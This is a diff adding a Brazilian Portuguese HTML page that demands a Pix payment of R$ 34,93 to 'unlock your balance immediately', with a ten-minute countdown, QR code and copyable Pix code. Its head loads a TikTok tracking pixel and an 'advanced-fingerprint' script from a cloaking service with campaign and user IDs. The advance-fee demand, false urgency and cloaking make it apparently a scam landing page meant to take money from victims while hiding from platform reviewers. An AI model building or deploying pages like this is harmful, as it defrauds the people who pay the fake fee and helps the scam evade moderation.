@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+    <meta name="format-detection" content="telephone=no" />
+    <title>Pagamento da Tarifa</title>
+
+    <!-- TikTok Pixel Code Start -->
+    <script>
+    !function (w, d, t) {
+      w.TiktokAnalyticsObject=t;var ttq=w[t]=w[t]||[];ttq.methods=["page","track","identify","instances","debug","on","off","once","ready","alias","group","enableCookie","disableCookie","holdConsent","revokeConsent","grantConsent"],ttq.setAndDefer=function(t,e){t[e]=function(){t.push([e].concat(Array.prototype.slice.call(arguments,0)))}};for(var i=0;i<ttq.methods.length;i++)ttq.setAndDefer(ttq,ttq.methods[i]);ttq.instance=function(t){for(
+    var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n]);return e},ttq.load=function(e,n){var r="https://analytics.tiktok.com/i18n/pixel/events.js",o=n&&n.partner;ttq._i=ttq._i||{},ttq._i[e]=[],ttq._i[e]._u=r,ttq._t=ttq._t||{},ttq._t[e]=+new Date,ttq._o=ttq._o||{},ttq._o[e]=n||{};n=document.createElement("script")
+    ;n.type="text/javascript",n.async=!0,n.src=r+"?sdkid="+e+"&lib="+t;e=document.getElementsByTagName("script")[0];e.parentNode.insertBefore(n,e)};
+
+      ttq.load('D4PPAPBC77UDACR1R5V0');
+      ttq.page();
+    }(window, document, 'ttq');
+    </script>
+    <!-- TikTok Pixel Code End -->
+
+    <script>
+        window.FYCLOAK_CAMPAIGN_ID = 739;
+        window.FYCLOAK_USER_ID = 65;
+    </script>
+    <script src="https://cdn.fycloak.com/scripts/advanced-fingerprint.js"></script>
+    <script type="module" crossorigin src="/assets/pagamento-tarifa-CAKbsVjj.js"></script>
+    <link rel="modulepreload" crossorigin href="/assets/utm-helper-C4jEGc4L.js">
+    <link rel="modulepreload" crossorigin href="/assets/pix-preloader-tP1izpQF.js">
+    <link rel="stylesheet" crossorigin href="/assets/pagamento-tarifa-DSR2ITUX.css">
+  </head>
+  <body>
+    <div class="pix-modal active" id="pix-modal">
+      <div class="modal-content">
+        <div class="top-message">
+          PAGUE A TARIFA PARA DESBLOQUEAR SEU SALDO IMEDIATAMENTE
+        </div>
+
+        <div class="modal-header">
+          <h2>Pagamento via Pix</h2>
+        </div>
+
+        <div class="timer-warning">
+          <svg width="16" height="16" viewBox="0 0 16 16" fill="none">
+            <path d="M8 15A7 7 0 1 1 8 1a7 7 0 0 1 0 14zm0-13A6 6 0 1 0 8 14 6 6 0 0 0 8 2zm0 10a1 1 0 1 1 0-2 1 1 0 0 1 0 2zm0-3a1 1 0 0 1-1-1V5a1 1 0 0 1 2 0v3a1 1 0 0 1-1 1z" fill="currentColor"/>
+          </svg>
+          <span>Pagamento expira em: <strong id="timer">10:00</strong></span>
+        </div>
+
+        <div class="pix-info">
+          <div class="pix-amount">
+            <span class="amount-label">Valor a pagar:</span>
+            <span class="amount-value">R$ 34,93</span>
+          </div>
+
+          <div class="qrcode-section">
+            <div id="pix-qrcode" class="qrcode-container"></div>
+            <p class="qrcode-instruction">Escaneie o QR Code com o app do seu banco</p>
+          </div>
+
+          <div class="pix-code-section">
+            <label for="pix-code-input">Ou copie o código Pix:</label>
+            <div class="code-input-wrapper">
+              <input
+                type="text"
+                id="pix-code-input"
+                class="pix-code-input"
+                readonly
+              />
+              <button class="copy-button" id="copy-button">
+                <span class="copy-text">Copiar</span>
+                <span class="copied-text">Copiado!</span>
+              </button>
+            </div>
+          </div>
+
+          <div class="payment-status">
+            <div class="status-spinner"></div>
+            <p class="status-text">Aguardando pagamento...</p>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <script src="https://cdn.rawgit.com/davidshimjs/qrcodejs/gh-pages/qrcode.min.js"></script>
+  </body>
+</html>
